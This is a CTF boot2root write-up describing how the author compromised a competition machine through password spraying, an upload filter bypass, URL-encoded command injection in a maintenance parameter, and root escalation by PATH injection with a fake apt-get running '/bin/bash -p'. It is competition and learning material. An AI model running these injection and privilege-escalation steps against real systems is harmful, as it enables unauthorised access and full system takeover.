<div style="display:block;text-align:middle"><img align="middle" src="https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3e30ac37-cb08-4ac9-89d9-73271b6ae425%2Fposter.jpg?id=c0d21156-5af6-4626-8d7d-770a731f728f&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=1250&userId=&cache=v2" border="0" style="width:450px;">

  
It was a boot2root CTF competition Conducted By IIT Bhubaneswar .
  
```http
  Machine IP : 191.101.3.104
```
### Nmap Scan
```sh
PORT     STATE  SERVICE REASON
22/tcp   open   ssh     syn-ack ttl 50
53/tcp   open   domain  syn-ack ttl 56
80/tcp   open   http    syn-ack ttl 59
443/tcp  open   https   syn-ack ttl 49
1075/tcp closed rdrmshc reset ttl 43
```
so i first tried visiting the port 80

![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fec9f0d5e-cd44-4edc-b53a-b82fa7816b20%2F80.png?id=966259b2-8eca-45f1-a7d3-cc941d0529d2&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
 
it was a basic apache2 homepage , so i skipped
head on to port 443 , there i found this interesting page :

![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F173dd7cd-91f6-4aa8-b484-12a1efd16aca%2F443.png?id=afd219ea-4d74-4281-a82d-8b96b830b22f&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
  
this looked interesting to me so i fuzzed it & got some endpoints :

```sh
302      GET        1l        4w       23c http://191.101.3.104:443/logout => /
200      GET       29l      120w     1707c http://191.101.3.104:443/
200      GET       51l      122w     1870c http://191.101.3.104:443/maintenance
200      GET       51l      122w     1870c http://191.101.3.104:443/Maintenance
302      GET        1l        4w       23c http://191.101.3.104:443/Logout => /
200      GET       81l      143w     2641c http://191.101.3.104:443/complaints
```
  
`maintenance` & `complaints` endpoints looks very interesting so i visited both & it looked like this :

Maintenance page :
  
![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F53b66e65-c7aa-4e06-9bb8-d28f662171d3%2Fmain-login.png?id=bb7a287d-a1ac-4360-b5ee-ce62d23f9731&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=1150&userId=&cache=v2)
  
maintenance page had a login portal i tried password spraying attack on it & it got cracked in seconds
  
![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa5831c61-84af-4e34-b4c7-59ceefe2a508%2Fpassword-spraying.png?id=8186e9f8-54d0-4224-b38c-ef5fea73d8c6&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
  
so `admin:password1` were the creds for the login page . i successfully logged in to the maintenance page

after loggin in :
  
![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6362dc41-51e8-4491-bad3-152548143d4b%2Fmaintenance.png?id=1b2d9c4e-70e5-490a-b882-051b3e2ff9b1&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
  
 maintenance page had 2 buttons called `Free-up storage` & `Cleanup-cache`
  
 the request for these 2 buttons were :
  
 ![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6d195405-b6a2-4d24-b42e-a3ccbda91ab4%2Fmaitenance-request.png?id=f1e1d9c7-4abb-45b3-a381-9382d027d3c0&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=1630&userId=&cache=v2)
  
 so it gave some idea that i can run some code execution from here
  
  Complaint Page :
  
  ![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7e2dcb5c-5db2-4ff5-9a79-b09e461cedc4%2Fcomplaints.png?id=9a20ceca-d375-445a-9977-2dde2113bc77&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
  
when i checked the other endpoint called complaints it had file upload vulnerability
i tried uploading reverse-shell.php but i noticed its using `nodejs` so php rev shell wont work , i took my teammate Raj's help to figure out the shell   part 
so i tried with bash shell , one more thing was there that user can only upload images so i had to do extension bypass using burp :
 
![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa914d3b8-0f21-415f-b121-db1e2b8a63dc%2Ffoothold.png?id=a1572433-0fab-4239-8b8a-a8c9214b1ff8&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
  
here i used bind shell because due to some reasons my rev shell wasnt working & used ports over 1024 as they are reserved ports & they need sudo perm in linux if u want to listen/emit on them , so basically i changed the extension from `foothold.sh.jpg` to `foothold.sh` here & it bypassed the filter & got uploaded as a sh script . the path it got uploaded to was ./images  

![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9ccb93db-152d-44b5-93b3-dc212a69c8a0%2Fuploads-dir.png?id=e220c5a2-64ed-4d1b-b0b3-bffe03a98475&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=1060&userId=&cache=v2)
  
so my shell got uploaded but now i need to trigger it so i went back to maintenance page where i had a param which was executing. i knew the path now so i used && with url encoded , typed bash to invoke my script `[foothold.sh](http://foothold.sh)` 

so the actual payload was :
```sh
script_to_run=Cleanup.out %26%26 bash ./images/foothold.sh %3c%3c
```

& we got shell yay :
  
![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa2b3516a-20e2-4738-92b4-fbfda34ca98f%2Ffooldhold2.png?id=cc0fdffd-dc73-4158-a82e-dcc6106b1c29&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)

## PrivEsc

we are logged in as guest user now we need to be root
so i did manual enumeration of privesc 
i found out `/home/node/webapp/scripts/cleanup.sh` is `suid` bin & later on playing with that folder i found out its leading to path injection , where `apt-get` binary is called by the cleanup.sh program which was ran by root . it gave me the idea of path Injection 

#### Path Injection to root
```sh
step 1 : echo '#!/bin/bash' > /tmp/apt-get
step 2 : echo '/bin/bash -p' >> /tmp/apt-get
step 3 : chmod +x /tmp/apt-get
step 4 : export PATH=/tmp:$PATH
step 5 : cd /home/node/webapp/scripts/
step 6 : ./Cleanup.out

Boom Rooted
```
& We got root :)

![](https://ctfserver.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc1cb6a30-a0d2-4a77-8bbb-53bed1161483%2Froot-privesc.png?id=ffa44f9a-dcb1-4bfc-8ce6-e183fb68e5bc&table=block&spaceId=c3ad219a-dbb4-4c28-8291-47bfde76d88a&width=2000&userId=&cache=v2)
  
#### P.S : Won this CTF :)
